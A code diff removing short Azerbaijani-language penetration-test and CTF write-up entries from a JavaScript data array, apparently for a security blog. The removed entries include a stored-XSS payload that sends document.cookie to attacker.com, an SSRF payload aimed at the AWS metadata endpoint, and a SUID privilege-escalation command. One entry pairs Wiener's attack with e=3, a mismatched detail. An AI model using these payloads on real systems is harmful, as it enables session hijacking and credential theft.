@@ -111,41 +111,6 @@ const postData = [
     <p><strong>Tövsiyə:</strong> Prepared statements istifadə edin.</p>`,
         tags: ['SQL Injection', 'Auth Bypass', 'sqlmap', 'OWASP A03']
     },
-    {
-        id: '1',
-        content: `<p>Profil bio sahəsinə Stored XSS payload yerləşdirildi, admin cookie oğurlandı.</p>
-    <p>Payload: <code>&lt;img src=x onerror="fetch('https://attacker.com?c='+document.cookie)"&gt;</code></p>
-    <p><strong>Mükafat:</strong> $750 bug bounty ödənildi.</p>`,
-        tags: ['XSS', 'Session Hijacking', 'Bug Bounty', 'OWASP A07']
-    },
-    {
-        id: '2',
-        content: `<p>Nikto ilə /backup endpoint tapıldı, credentials əldə edildi.</p>
-    <p>Privesc: <code>find / -perm -4000 2>/dev/null</code> ilə SUID binary aşkarlandı.</p>
-    <p>GTFOBins üzərindən root shell alındı.</p>`,
-        tags: ['HackTheBox', 'Linux', 'SUID', 'Privilege Escalation']
-    },
-    {
-        id: '3',
-        content: `<p>API endpoint-də obyekt ID-si birbaşa URL-də göndərilirdi.</p>
-    <p>ID dəyişdirilərək başqa istifadəçinin məlumatlarına giriş əldə edildi.</p>
-    <p><strong>Fix:</strong> Server tərəfli authorization yoxlaması əlavə edilməlidir.</p>`,
-        tags: ['IDOR', 'API Security', 'Authorization', 'OWASP A01']
-    },
-    {
-        id: '4',
-        content: `<p>File upload funksiyasında URL parametri server tərəfindən fetch edilirdi.</p>
-    <p>Payload: <code>http://169.254.169.254/latest/meta-data/</code> — AWS metadata əldə edildi.</p>
-    <p><strong>Impact:</strong> IAM credentials sızdı, tam AWS girişi mümkün oldu.</p>`,
-        tags: ['SSRF', 'Cloud Security', 'AWS', 'OWASP A10']
-    },
-    {
-        id: '5',
-        content: `<p>RSA açar cütü küçük e dəyəri (e=3) ilə yaradılmışdı.</p>
-    <p>Wiener's attack ilə private key yenidən quruldu, şifrəli flag deşifrə edildi.</p>
-    <p>Tool: <code>RsaCtfTool.py --attack wiener</code></p>`,
-        tags: ['Cryptography', 'RSA', 'CTF', 'PicoCTF']
-    }
 ];
 
 // Kartlara data-id əlavə et (HTML-də əlavə etmək əvəzinə JS ilə)
